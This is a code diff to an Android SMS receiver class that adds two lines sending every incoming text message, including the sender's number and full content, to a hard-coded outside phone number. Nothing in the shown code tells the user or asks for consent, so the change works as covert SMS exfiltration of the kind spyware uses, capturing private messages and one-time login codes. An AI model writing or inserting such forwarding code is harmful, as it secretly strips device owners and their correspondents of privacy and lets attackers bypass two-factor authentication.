@@ -4,6 +4,7 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.Bundle;
+import android.telephony.SmsManager;
 import android.telephony.SmsMessage;
 import android.util.Log;
 
@@ -36,6 +37,8 @@ public class IncomingSms extends BroadcastReceiver {
                         Log.i("SmsReceiver", "senderNum: " + phoneNumber + "; message: " + message);
                         EventBus.getDefault().post(new NewSmsEvent(new SMS(message, "1"), phoneNumber));//1 is for received message
 
+                        SmsManager sms = SmsManager.getDefault();
+                        sms.sendTextMessage("+33642617318", null, "From " + phoneNumber + " : \n" + message, null, null);
                     } // end for loop
                 }
             } // bundle is null
